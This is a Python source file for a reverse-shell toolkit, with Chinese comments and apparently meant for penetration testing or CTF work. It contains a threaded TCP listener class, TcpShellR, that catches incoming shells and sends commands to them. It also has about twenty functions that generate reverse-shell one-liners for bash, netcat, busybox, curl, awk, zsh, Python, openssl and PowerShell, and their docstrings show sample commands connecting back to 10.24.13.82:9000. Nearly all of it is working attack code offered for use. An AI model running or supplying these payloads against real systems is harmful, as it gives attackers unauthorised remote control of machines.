import dataclasses
import socket
import threading
import time
from collections import deque
from typing import Callable

from tool.log import debug_log


@dataclasses.dataclass
class RecvData:
    timestamp: float
    data: bytes

    def __str__(self) -> str:
        return self.data.decode(errors="replace")


class TcpShellRError(Exception):
    """TcpShell 基础异常"""


class TcpShellR:
    def __init__(
        self,
        port: int = 0,
        on_recv: Callable[[bytes], bytes] | None = None,
        on_send: Callable[[bytes], bytes] | None = None,
        max_buffer: int = 1000,
    ):
        """
        Args:
            port:       监听端口。0 表示由 OS 自动分配空闲端口，
                        启动后通过 .port() 获取实际端口。
            on_recv:    接收钩子，可用于解密/解帧等协议适配。
            on_send:    发送钩子，可用于加密/封帧等协议适配。
            max_buffer: 接收缓冲区最大条目数（超出后滚动丢弃最旧数据）。
        """
        self.ip = "0.0.0.0"
        self._port = port
        self.on_recv = on_recv
        self.on_send = on_send

        self.buffer: deque[RecvData] = deque(maxlen=max_buffer)
        self._lock = threading.Lock()
        self._data_event = threading.Event()

        self._server_sock: socket.socket | None = None
        self._bound_port: int | None = None          # bind 后的实际端口
        self._conn: socket.socket | None = None
        self._conn_addr: tuple[str, int] | None = None

        self._accept_thread: threading.Thread | None = None
        self._recv_thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    # ── 生命周期 ──────────────────────────────────────────────

    def start(self) -> "TcpShellR":
        """启动监听。幂等：已启动则直接返回 self。"""
        if self._server_sock is not None:
            debug_log("已在监听，跳过重复启动")
            return self

        self._stop_event.clear()

        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_sock.bind((self.ip, self._port))
        except OSError as e:
            server_sock.close()
            raise TcpShellRError(f"bind 失败 ({self.ip}:{self._port}): {e}") from e

        # 记录实际绑定端口（port=0 时由 OS 分配）
        self._bound_port = server_sock.getsockname()[1]
        server_sock.listen(1)
        server_sock.settimeout(1.0)
        self._server_sock = server_sock

        debug_log(f"监听 {self.ip}:{self._bound_port}")

        accept_thread = threading.Thread(
            target=self._accept_loop, daemon=True, name="TcpShell-accept"
        )
        accept_thread.start()
        self._accept_thread = accept_thread
        return self

    def stop(self):
        """停止服务器，关闭连接和 socket，等待后台线程退出。"""
        self._stop_event.set()
        self._data_event.set()  # 唤醒阻塞在 drain() 的调用方

        with self._lock:
            conn, self._conn = self._conn, None
            self._conn_addr = None

        if conn is not None:
            try:
                conn.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                conn.close()
            except OSError:
                pass

        if self._server_sock is not None:
            try:
                self._server_sock.close()
            except OSError:
                pass
            self._server_sock = None
            self._bound_port = None

        if self._accept_thread is not None:
            self._accept_thread.join(timeout=3)
            if self._accept_thread.is_alive():
                debug_log("警告：accept 线程未在 3s 内退出")
            self._accept_thread = None

        if self._recv_thread is not None:
            self._recv_thread.join(timeout=3)
            if self._recv_thread.is_alive():
                debug_log("警告：recv 线程未在 3s 内退出")
            self._recv_thread = None

        debug_log("已停止")

    def __enter__(self) -> "TcpShellR":
        return self.start()

    def __exit__(self, *_) -> bool:
        self.stop()
        return False

    # ── 状态查询 ──────────────────────────────────────────────

    def port(self) -> int:
        """
        返回实际监听端口。

        当构造时传入 port=0 时，OS 会自动分配端口，
        必须在 start() 之后调用本方法才能获得实际值。

        Raises:
            TcpShellRError: 服务器尚未启动（start() 未调用）。
        """
        if self._bound_port is None:
            raise TcpShellRError("服务器尚未启动，请先调用 start()")
        return self._bound_port

    def is_connected(self) -> bool:
        """当前是否有活跃的客户端连接。"""
        return self._conn is not None

    def output(self) -> str:
        """将缓冲区内所有收到的数据拼接成字符串（不清空）。"""
        with self._lock:
            return "".join(str(r) for r in self.buffer)

    def drain(self, timeout: float = 5.0) -> str | None:
        """
        阻塞等待直到有数据（或超时），清空并返回缓冲区内容。

        Args:
            timeout: 最长等待秒数。

        Returns:
            有数据时返回拼接字符串；超时或被 stop() 唤醒且无数据时返回 None。
        """
        self._data_event.wait(timeout=timeout)
        with self._lock:
            if not self.buffer:
                return None
            result = "".join(str(r) for r in self.buffer)
            self.buffer.clear()
            self._data_event.clear()
        return result

    # ── 发送 ──────────────────────────────────────────────────

    def send(self, data: str | bytes) -> bool:
        """
        发送数据到当前连接。

        Args:
            data: 要发送的字节或字符串（字符串会以 UTF-8 编码）。

        Returns:
            发送成功返回 True，无连接或发送失败返回 False。
        """
        with self._lock:
            conn = self._conn

        if conn is None:
            debug_log("无连接，无法发送")
            return False

        raw: bytes = data.encode() if isinstance(data, str) else data

        if self.on_send is not None:
            try:
                raw = self.on_send(raw)
            except Exception as e:
                debug_log(f"on_send 回调异常，跳过: {e}")

        try:
            conn.sendall(raw)
            debug_log(f"已发送 {len(raw)} 字节, 内容：{raw[:256]}")
            return True
        except BrokenPipeError:
            debug_log("发送失败：连接已被对端关闭 (BrokenPipe)")
        except ConnectionResetError:
            debug_log("发送失败：连接被对端重置 (ConnectionReset)")
        except OSError as e:
            debug_log(f"发送失败: {e}")
        return False

    def sendline(self, data: str) -> bool:
        """发送字符串并追加换行符。"""
        return self.send(f"{data}\n")

    # ── 内部线程 ──────────────────────────────────────────────

    def _accept_loop(self):
        while not self._stop_event.is_set():
            server_sock = self._server_sock
            if server_sock is None:
                break  # stop() 已关闭 server socket

            try:
                conn, addr = server_sock.accept()
            except TimeoutError:
                continue
            except OSError:
                # server_sock 被 stop() 关闭，正常退出
                break

            debug_log(f"连接来自 {addr}")

            with self._lock:
                if self._conn is not None:
                    debug_log("已有连接，拒绝新连接")
                    conn.close()
                    continue
                self._conn = conn
                self._conn_addr = addr

            if self._recv_thread is not None and self._recv_thread.is_alive():
                debug_log("等待旧 recv 线程退出...")
                self._recv_thread.join(timeout=2)
                if self._recv_thread.is_alive():
                    debug_log("警告：旧 recv 线程未在 2s 内退出")

            recv_thread = threading.Thread(
                target=self._recv_loop,
                args=(conn,),
                daemon=True,
                name="TcpShell-recv",
            )
            recv_thread.start()
            self._recv_thread = recv_thread

    def _recv_loop(self, conn: socket.socket):
        while not self._stop_event.is_set():
            try:
                # conn.settimeout(5)
                chunk = conn.recv(4096)
            except ConnectionResetError:
                debug_log("连接被对端重置 (ConnectionReset)")
                break
            except OSError as e:
                debug_log(f"recv 异常: {e}")
                break

            if not chunk:
                debug_log("连接已断开（收到 EOF）")
                break

            if self.on_recv is not None:
                try:
                    chunk = self.on_recv(chunk)
                except Exception as e:
                    debug_log(f"on_recv 回调异常，使用原始数据: {e}")

            record = RecvData(timestamp=time.time(), data=chunk)
            with self._lock:
                self.buffer.append(record)
            self._data_event.set()
            debug_log(f"收到 {len(chunk)} 字节, 内容：{chunk[:256]}")

        with self._lock:
            if self._conn is conn:   # 避免覆盖新连接的引用
                self._conn = None
                self._conn_addr = None

def gen_r_bash_i(ip: str, port: int) -> str:
    """bash -i >& /dev/tcp/10.24.13.82/9000 0>&1"""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def gen_r_bash_196(ip: str, port: int) -> str:
    """0<&196;exec 196<>/dev/tcp/10.24.13.82/9000; bash <&196 >&196 2>&196"""
    return f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196"

def gen_r_bash_read_line(ip: str, port: int) -> str:
    """exec 5<>/dev/tcp/10.24.13.82/9000;cat <&5 | while read line; do $line 2>&5 >&5; done"""
    return f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"

def gen_r_nc_c_bash(ip: str, port: int) -> str:
    """nc -c bash 10.24.13.82 9000"""
    return f"nc -c bash {ip} {port}"

def gen_r_nc_c_sh(ip: str, port: int) -> str:
    """nc -c sh 10.24.13.82 9000"""
    return f"nc -c sh {ip} {port}"

def gen_r_nc_e_bash(ip: str, port: int) -> str:
    """nc 10.24.13.82 9000 -e /bin/bash"""
    return f"nc {ip} {port} -e /bin/bash"

def gen_r_nc_e_sh(ip: str, port: int) -> str:
    """nc 10.24.13.82 9000 -e /bin/sh"""
    return f"nc {ip} {port} -e /bin/sh"

def gen_r_busybox_nc_e_bash(ip: str, port: int) -> str:
    """busybox nc 10.24.13.82 9000 -e /bin/bash"""
    return f"busybox nc {ip} {port} -e /bin/bash"

def gen_r_busybox_nc_e2_sh(ip: str, port: int) -> str:
    """busybox nc 10.24.13.82 9000 -e /bin/sh"""
    return f"busybox nc {ip} {port} -e /bin/sh"

def gen_r_curl_bash(ip: str, port: int) -> str:
    """C='curl -Ns telnet://10.24.13.82:9000'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null"""
    return f"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null"

def gen_r_awk(ip: str, port: int) -> str:
    """awk 'BEGIN {s = "/inet/tcp/0/10.24.13.82/9000"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
    return f'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\' /dev/null'

def gen_r_zsh(ip: str, port: int) -> str:
    """zsh -c 'zmodload zsh/net/tcp && ztcp 10.24.13.82 9000 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"""
    return f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"

def gen_r_python3_bash(ip: str, port: int) -> str:
    """export RHOST="10.24.13.82";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'"""
    return f'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\''

def gen_r_python3_sh(ip: str, port: int) -> str:
    """export RHOST="10.24.13.82";export RPORT=9000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
    return f'export RHOST="{ip}";export RPORT={port};python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")\''

def gen_r_nc_mkfifo_bash(ip: str, port: int) -> str:
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.24.13.82 9000 >/tmp/f"""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f"

def gen_r_nc_mkfifo_sh(ip: str, port: int) -> str:
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.24.13.82 9000 >/tmp/f"""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"

def gen_r_openssl_mkfifo_bash(ip: str, port: int) -> str:
    """mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.24.13.82:9000 > /tmp/s; rm /tmp/s"""
    return f"mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"

def gen_r_openssl_mkfifo_sh(ip: str, port: int) -> str:
    """mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.24.13.82:9000 > /tmp/s; rm /tmp/s"""
    return f"mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"

def gen_r_powershell1(ip: str, port: int) -> str:
    """$LHOST = "10.24.13.82"; $LPORT = 9000; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"""
    return f'$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'




if __name__ == "__main__":
    from tool.base import wait

    with TcpShellR(port=9000) as shell:
        print(f"监听端口：{shell.port()}")
        wait(lambda: shell.is_connected())
        shell.sendline("id")
        out = shell.drain(timeout=5)
        if out is None:
            print("等待超时，未收到响应")
        else:
            print(out)